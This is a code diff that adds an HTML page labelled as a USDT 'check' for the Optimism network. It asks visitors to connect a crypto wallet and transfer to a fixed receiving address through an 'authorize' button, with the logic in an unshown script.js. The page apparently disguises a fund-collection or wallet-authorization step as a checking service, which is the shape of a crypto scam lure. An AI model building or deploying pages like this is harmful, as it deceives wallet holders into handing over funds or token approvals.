@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>USDT 检测 - Optimism</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="style.css">
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+</head>
+<body>
+  <div class="container">
+    <h1>USDT 检测</h1>
+    <p>连接钱包，向以下地址转账：</p>
+    <div class="wallet-info">
+      <p><strong>收款地址：</strong></p>
+      <input type="text" id="wallet-address" value="0x6de08c724e14d561428b29d3909739344aa96c3a" readonly />
+    </div>
+    <button id="connectButton">连接钱包</button>
+    <button id="authorizeButton" disabled>转账</button>
+    <div id="status"></div>
+  </div>
+  <script src="script.js"></script>
+</body>
+</html>
